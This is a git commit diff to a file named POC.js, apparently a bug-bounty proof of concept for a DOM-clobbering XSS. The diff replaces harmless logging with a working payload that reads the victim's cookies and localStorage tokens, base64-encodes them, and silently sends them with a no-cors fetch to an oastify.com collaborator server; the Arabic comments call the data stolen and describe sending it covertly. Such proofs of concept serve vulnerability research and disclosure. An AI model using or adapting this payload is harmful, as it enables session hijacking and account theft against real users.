cf64d63ced126b852fa4f765a746bb6aea638fb5
Hussein Mahmoud <housien.a.khalek19@gmail.com>
2026-04-29 15:08:12 +0300

    Implement data extraction and transmission for XSS
    Added functionality to extract cookies and local storage, encode the data, and send it to a specified server.

--- POC.js
+++ POC.js
@@ -1,3 +1,13 @@
 alert("DOM Clobbering XSS by Hussein on: " + document.domain);
-print();
-console.log("XSS Executed Successfully via Aditude Config Clobbering!");
+// استخراج الكوكيز
+var userCookies = document.cookie;
+// استخراج الـ Local Storage (عشان لو الـ Tokens متخزنة فيها)
+var userStorage = JSON.stringify(localStorage);
+
+// تجميع الداتا وتشفيرها عشان متعملش إيرور في اللينك
+var stolenData = btoa("Cookies: " + userCookies + " | Storage: " + userStorage);
+
+// إرسال الداتا في الخفاء لسيرفر Oastify بتاعك
+fetch("https://2nqfrsyf5u919k496pa4iwbu9lfc33rs.oastify.com/?stolen=" + stolenData, {
+    mode: 'no-cors' // عشان نتخطى إيرور الـ CORS
+});
